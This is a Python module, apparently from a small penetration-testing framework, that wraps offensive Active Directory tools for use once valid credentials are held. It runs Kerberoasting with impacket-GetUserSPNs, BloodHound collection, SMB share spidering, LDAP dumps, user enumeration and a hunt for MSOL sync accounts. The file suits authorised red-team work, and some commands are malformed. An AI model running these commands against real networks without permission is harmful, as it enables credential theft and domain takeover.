import os
from colorama import Fore, Style, init
from core.module_base import ModuleBase
from utils.input_or_file import get_input_or_file
from utils.run_command import run_command



init()


class ValidCreds(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "valid_creds"
        self.options = {
            "ip" : None,
            "user" : None,
            "password" : None,
            "domain": None,
        }
        self.actions = {
            "kerberoasting": self.kerberoasting,
            "bloodhound": self.bloodhound,
            "find_all_users": self.find_all_users,
            "find_msol": self.find_MSOL,
            "enumerate_ldap": self.enumerate_ldap,
            "enumerate smb": self.enumerate_smb,
            "all": self.run_all
        }
        self.color = Fore.GREEN


    def _prepare(self):
        ip = self.options["ip"]
        if not ip:
            print("[-] ip be set!")
            return None, None
        ip_list = get_input_or_file(ip)
        return ip_list
    
 


    
    def kerberoasting(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        domain = self.options["domain"]
        if not all([ip,user,password,domain]):
            print("You must set ip,user,password and domain for kerberoasting")
            return
        
        target = f"{domain}/{user}:{password}"
        command = ["impacket-GetUserSPNs", "-request","dc-ip", ip,target]
        res = run_command(command)
        print(f"[KERBEROASTING] {user}:{password}@{ip} => {res}")


    def bloodhound(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        domain = self.options["domain"]
        if not all([ip,user,password]):
            print("Need ip,user, domain and password for bloodhound")
            return
        tools = ["bloodhound-python","nxc" ]
        print("tool available: \n")
        for cmd in tools:
            print(f"- {cmd}")
        choix =input(f"tool to use ?(default bloodhound-python): ")

        if not choix:
            choix = "bloodhound-python"

        print(f"using {choix}")


        result_dir = "results/bloodhound/bloodhound-python"
        os.makedirs(result_dir, exist_ok=True)
        output = os.path.join(result_dir, "bh")

        command = ["bloodhound-python", "-d", domain, "-u", user, "-p", password, "-gc", domain, "-c", "all", "-op", output] 

        #todo : fix output logic for nxc 
        if choix != "bloodhound-python":
            command = ["nxc", "ldap", ip, "-u", user, "-p", password, "--bloodhound", "--collection", "All"]
        res = run_command(command)
        print(f"result stored in {output}")




    def enumerate_smb(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        command = [
            "nxc",
            "smb",
            ip,
            "-u",
            user,
            "-p",
            password,
            "-M",
            "spider_plus"
        ]
        res = run_command(command)
        print(f"{res}")
 


    def enumerate_ldap(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        tools = ["ldapdomaindump","ldapsearch" ]
        print("tool available: \n")
        for cmd in tools:
            print(f"- {cmd}")
        choix =input(f"tool to use ?(default ldapdomaindump): ")
        if not choix:
            choix = "ldapdomaindump"
        print(f"using {choix}\n")
        target = f"ldap//{ip}:389"
        command=["ldapdomaindump", "-u", user, "-p", password, "-o", "/home", target]
        res = run_command(command)
        print(f"{res}")


    def find_all_users(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        domain = self.options["domain"]
        if not all([ip,user,password,domain]):
            print("Need ip,user,domain,password")
            return
        
        target = f"{domain}/{user}:{password}"
        command = ["impacket-GetADUsers", target, "-all", "-dc-ip", ip]
        res = run_command(command)
        print(f"{res}")


    #def certipy-ad(self)
    #    ip = s



    def find_MSOL(self):
        ip = self.options["ip"]
        user = self.options["user"]
        password = self.options["password"]
        if not all([ip,user,password]):
            print("Need ip,user and domain")
            return
        command = ["nxc", "ldap", ip, "-u", user,"-p",password,"-M","get-desc-users"]
        res = run_command(command)
        if "MSOL" in res:
            print(f"{res}")
        else:
            print("no MOSL found")

    def run_all(self):
        print(f"\n[🔥] Running all {self.name} actions...\n")
        #if not self.options["ip","domain","password","user"]:
        #    print("[-] Need ip and/or domain... use 'options'")
        #    return
        #if not self.options["domain"]:
        #    print("[-] Domain not set, blind kerberoasting may not work properly")
        self.find_all_users()
        print("-"*50)
        self.kerberoasting()
        print("-"*50)
        self.bloodhound()
        print("-"*50)
        self.find_MSOL()
        print("-"*50)
